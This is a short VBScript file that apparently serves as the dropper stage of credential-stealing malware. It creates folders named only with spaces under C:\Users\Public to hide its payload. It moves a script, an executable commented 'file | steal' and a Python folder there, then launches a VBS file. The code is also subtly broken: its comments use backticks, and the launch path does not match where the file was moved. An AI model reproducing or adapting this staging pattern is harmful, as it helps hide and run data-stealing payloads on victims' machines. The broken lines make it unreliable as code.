DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )

SET FSO=CreateObject("Scripting.FileSystemObject")
FSO.CreateFolder("C:\Users\Public\ \")
FSO.CreateFolder("C:\Users\Public\ \ \")

FSO.Movefile "file\a.vbs","C:\Users\Public\ \ " ` run
FSO.Movefile "file\b.exe","C:\Users\Public\ \ " ` file | steal
FSO.Movefolder "file\pyC\","C:\Users\Public\ \ \" ` pythoniC

CreateObject("Wscript.Shell").Run """C:\Users\Public\a.vbs""", 1, True
